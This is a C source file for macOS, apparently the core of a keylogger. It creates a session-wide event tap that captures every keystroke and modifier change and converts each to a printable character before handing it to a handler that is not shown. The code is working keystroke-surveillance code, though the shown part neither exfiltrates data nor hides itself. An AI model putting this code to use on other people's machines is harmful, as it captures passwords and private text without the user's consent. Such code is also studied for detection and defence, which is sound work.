#include "keylogger.h"

CGEventFlags lastFlags = 0;

int start() {
    // Create an event tap to retrieve keypresses.
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
    CFMachPortRef eventTap = CGEventTapCreate(
            kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
    );

    // Exit the program if unable to create the event tap.
    if (!eventTap) {
        fprintf(stderr, "ERROR: Unable to create event tap.\n");
        exit(1);
    }

    // Create a run loop source and add enable the event tap.
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    CFRunLoopRun();

    return 0;
}

// The following callback method is invoked on every keypress.
CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged) {
        return event;
    }

    CGEventFlags flags = CGEventGetFlags(event);

    // Retrieve the incoming keycode.
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    // Calculate key up/down.
    bool down = false;
    if (type == kCGEventFlagsChanged) {
        switch (keyCode) {
            case 54: // [right-cmd]
            case 55: // [left-cmd]
                down = (flags & kCGEventFlagMaskCommand) && !(lastFlags & kCGEventFlagMaskCommand);
                break;
            case 56: // [left-shift]
            case 60: // [right-shift]
                down = (flags & kCGEventFlagMaskShift) && !(lastFlags & kCGEventFlagMaskShift);
                break;
            case 58: // [left-option]
            case 61: // [right-option]
                down = (flags & kCGEventFlagMaskAlternate) && !(lastFlags & kCGEventFlagMaskAlternate);
                break;
            case 59: // [left-ctrl]
            case 62: // [right-ctrl]
                down = (flags & kCGEventFlagMaskControl) && !(lastFlags & kCGEventFlagMaskControl);
                break;
            case 57: // [caps]
                down = (flags & kCGEventFlagMaskAlphaShift) && !(lastFlags & kCGEventFlagMaskAlphaShift);
                break;
            default:
                break;
        }
    } else if (type == kCGEventKeyDown) {
        down = true;
    }
    lastFlags = flags;

    // Only log key down events.
    if (!down) {
        return event;
    }

    bool caps = flags & kCGEventFlagMaskAlphaShift;
    bool shift = flags & kCGEventFlagMaskShift;
    bool option = flags & kCGEventFlagMaskAlternate;
    bool cmd = flags & kCGEventFlagMaskCommand;
    bool control = flags & kCGEventFlagMaskControl;
    int mac_modifiers = 0;
    if (shift)
        mac_modifiers |= shiftKey;
    if (control)
        mac_modifiers |= controlKey;
    if (option)
        mac_modifiers |= optionKey;
    if (cmd)
        mac_modifiers |= cmdKey;
    UInt32 modifiersKeyState = (mac_modifiers >> 8) & 0xFF;
    char* printableRepr = createStringForKey(keyCode, modifiersKeyState);
    handleKeyPress(printableRepr, keyCode, caps, shift, option, cmd, control);

    return event;
}

/* Returns string representation of key, if it is printable.
 * Ownership follows the Create Rule; that is, it is the caller's
 * responsibility to release the returned object. */
char* createStringForKey(CGKeyCode keyCode, UInt32 modifiersKeyState)
{
    TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
    CFDataRef layoutData =
        TISGetInputSourceProperty(currentKeyboard,
                                  kTISPropertyUnicodeKeyLayoutData);
    const UCKeyboardLayout *keyboardLayout =
        (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);

    UInt32 deadKeyState = 0;
    UniChar chars[4];
    UniCharCount realLength;

    OSStatus status = UCKeyTranslate(
        keyboardLayout,
        keyCode,
        kUCKeyActionDown,
        modifiersKeyState,
        LMGetKbdType(),
        kUCKeyTranslateNoDeadKeysBit,
        &deadKeyState,
        sizeof(chars) / sizeof(chars[0]),
        &realLength,
        chars);
    CFRelease(currentKeyboard);
    CFStringRef keyStringRef = CFStringCreateWithCharacters(kCFAllocatorDefault, chars, 1);

    CFIndex length = CFStringGetLength(keyStringRef);
    CFIndex maxSize = CFStringGetMaximumSizeForEncoding(length, kCFStringEncodingUTF8);
    char *key = (char *)malloc(maxSize);
    CFStringGetCString(keyStringRef, key, maxSize,kCFStringEncodingUTF8);

    return key;
}
